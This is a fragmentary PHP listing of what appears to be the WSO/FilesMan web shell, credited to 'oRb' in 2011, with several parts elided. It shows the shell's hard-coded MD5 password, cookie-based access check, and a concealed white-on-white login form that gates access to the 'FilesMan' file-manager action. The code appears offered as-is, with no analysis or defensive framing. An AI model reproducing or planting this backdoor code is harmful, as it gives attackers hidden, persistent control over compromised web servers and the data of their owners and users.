...
$pass_1 = "d5c804476b2b794d84f22602ef3cc4ca";
$unknown_1 = true;
$charset_1 = 'UTF-8';
$filesman_1 = 'FilesMan';
$useragent_1 = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $useragent_1);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $charset_1;
if (!isset($_POST['ne'])) {
...
/* (С) 11.2011 oRb */
if(!empty($pass_1)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $pass_1))
        prototype(md5($_SERVER['HTTP_HOST']), $pass_1);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pass_1))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$unknown_1;
function hardLogin() {
	...
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#ffffff; text-shadow: 2px 0 0 #ffffff, -2px 0 0 #ffffff, 0 2px 0 #ffffff, 0 -2px 0 #ffffff, 1px 1px #ffffff, -1px -1px 0 #ffffff, 1px -1px 0 #ffffff, -1px 1px 0 #ffffff; text-align: center;'><input type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:white;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#ffffff;color:#fff;cursor:pointer;'></form></pre>
");
}
...
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['charset_1'];
...
if( empty($_POST['a']) )
	if(isset($filesman_1) && function_exists('action' . $filesman_1))
		$_POST['a'] = $filesman_1;
	else
		$_POST['a'] = 'FilesMan';
